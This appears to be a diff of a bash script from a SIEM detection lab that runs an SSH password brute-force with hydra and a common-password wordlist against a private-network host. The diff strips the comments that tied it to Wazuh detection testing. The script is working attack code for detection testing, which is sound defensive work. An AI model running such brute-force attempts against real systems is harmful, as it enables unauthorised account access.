@@ -1,26 +1,37 @@
 #!/bin/bash
-# Attack: SSH Brute Force
-# MITRE: T1110.001
-# Wazuh Rule: 100001
-# Run from: Host PC (Ubuntu 24.04)
-
 TARGET_IP="${1:-192.168.8.130}"
-TARGET_USER="${2:-ubuntu}"
-WORDLIST="${3:-/tmp/test_wordlist.txt}"
-
-echo "[+] Starting SSH brute force from HOST to $TARGET_IP"
-echo "[+] MITRE T1110.001 | Expected Wazuh Rule: 100001 (Level 10)"
+TARGET_USER="${2:-linux-endpoint-1}"
 
 if ! command -v hydra &> /dev/null; then
-    echo "[!] Installing hydra..."
-    sudo apt update && sudo apt install -y hydra
+    sudo apt update -qq && sudo apt install -y hydra -qq
 fi
 
-# Create test wordlist
-echo -e "password123\nadmin\n123456\nroot\nubuntu\nsiem-vm\npassword\n12345" > "$WORDLIST"
+WORDLIST="/tmp/brute_wordlist.txt"
+cat > "$WORDLIST" << 'PASSWORDS'
+password123
+admin
+123456
+root
+ubuntu
+siem-vm
+password
+12345
+qwerty
+letmein
+welcome
+monkey
+dragon
+master
+shadow
+sunshine
+princess
+football
+baseball
+iloveyou
+trustno1
+abc123
+password1
+admin123
+PASSWORDS
 
-echo "[+] Launching hydra..."
-hydra -l "$TARGET_USER" -P "$WORDLIST" -t 4 -f ssh://$TARGET_IP 2>/dev/null || true
-
-echo "[+] Done. Check Wazuh dashboard: https://192.168.8.129"
-echo "[+] Filter: rule.id:100001"
+hydra -l "$TARGET_USER" -P "$WORDLIST" -t 6 -f -V ssh://$TARGET_IP
